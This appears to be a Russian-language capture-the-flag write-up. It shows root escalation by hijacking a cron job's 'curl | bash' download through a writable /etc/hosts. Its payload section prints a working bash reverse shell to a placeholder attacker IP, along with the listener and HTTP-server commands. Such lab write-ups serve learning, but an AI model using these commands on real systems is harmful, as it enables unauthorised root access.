## Поиск root-вектора через pspy

Проверка обычных cron-файлов не дала результата. Поэтому загрузил `pspy64` и стал наблюдать за процессами, которые запускаются от имени root.

![Подготовка к мониторингу фоновых процессов](../images/Pasted%20image%2020260402170124.png)

Через некоторое время увидел root-процесс, который выполнял сетевой запрос:

```text
curl http://mkingdom.thm:85/app/castle/application/counter.sh | bash
```

Это означало, что root скачивает скрипт по доменному имени и сразу передаёт его в Bash.

![Обнаруженный root-запрос в выводе pspy](../images/Pasted%20image%2020260404123110.png)

## Подмена разрешения домена

Проверил права на `/etc/hosts` и обнаружил возможность записи для группы, в которую входил `mario`. Это позволяло направить `mkingdom.thm` на мою машину.

Сначала подготовил каталог с тем же путём, который использовал root-процесс:

```bash
mkdir -p /tmp/exploit/app/castle/application
```

В `counter.sh` разместил reverse-shell payload:

```bash
#!/bin/bash
bash -i >& /dev/tcp/KALI_IP/4445 0>&1
```

После этого добавил свою машину в `/etc/hosts` и запустил HTTP-сервер на порту `85`.

![Изменение hosts для перенаправления запроса](../images/Pasted%20image%2020260404123230.png)

Одновременно запустил listener:

```bash
nc -lvnp 4445
sudo python3 -m http.server 85
```

Когда cron сработал, root скачал мой скрипт и выполнил его.

![Получение root-shell через подменённый counter.sh](../images/Pasted%20image%2020260404131159.png)

## Итоговая цепочка

1. Получил web-shell через CMS.
2. Нашёл Base64-значение в окружении и перешёл с `toad` на `mario`.
3. С помощью `pspy` обнаружил root-команду `curl | bash`.
4. Использовал доступную для записи `/etc/hosts` для подмены домена.
5. Отдал свой `counter.sh` через HTTP-сервер и получил root reverse shell.

Главный вывод: при постэксплуатации важно смотреть не только статические конфигурации, но и реальные запуски процессов. `pspy` помог увидеть опасную сетевую зависимость, которую не было видно в обычном `crontab`.
